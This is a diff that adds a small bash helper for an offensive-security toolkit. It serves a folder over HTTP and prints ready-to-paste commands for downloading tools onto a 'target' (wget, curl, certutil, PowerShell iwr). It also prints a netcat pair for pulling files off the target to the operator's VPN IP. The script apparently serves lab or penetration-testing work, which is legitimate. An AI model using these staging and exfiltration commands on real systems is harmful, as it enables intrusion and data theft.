@@ -1,0 +1,20 @@
+#!/usr/bin/env bash
+# serve [dir] [port]   HTTP server + ready-to-paste download lines with your VPN IP.
+# Default: serve ~/tools/serve on 8000. Ctrl+C to stop.
+dir="${1:-$HOME/tools/serve}"; port="${2:-8000}"
+[ -d "$dir" ] || dir="$PWD"
+LHOST="$(~/.local/bin/hackbar vpn plain 2>/dev/null)"; [ -z "$LHOST" ] && LHOST="$(hostname -I | awk '{print $1}')"
+B=$'\e[38;2;122;162;247m'; G=$'\e[38;2;158;206;106m'; Y=$'\e[38;2;224;175;104m'; D=$'\e[38;2;86;95;137m'; X=$'\e[0m'
+echo "${B}serving${X} $dir  ${D}on${X} ${Y}$LHOST:$port${X}"
+echo "${D}files:${X} $(ls "$dir" 2>/dev/null | tr '\n' ' ')"
+echo
+echo "${G}# on target — Linux:${X}"
+echo "  wget http://$LHOST:$port/FILE -O /tmp/FILE"
+echo "  curl http://$LHOST:$port/FILE -o /tmp/FILE"
+echo "${G}# on target — Windows:${X}"
+echo "  certutil -urlcache -f http://$LHOST:$port/FILE FILE"
+echo "  powershell -c \"iwr http://$LHOST:$port/FILE -o FILE\""
+echo "${G}# pull a file FROM target (run a receiver here first):${X}"
+echo "  ${D}here:${X}  nc -lvnp $port > out.bin      ${D}target:${X} nc $LHOST $port < file"
+echo "${D}--------------------------------------------------${X}"
+cd "$dir" && python3 -m http.server "$port"
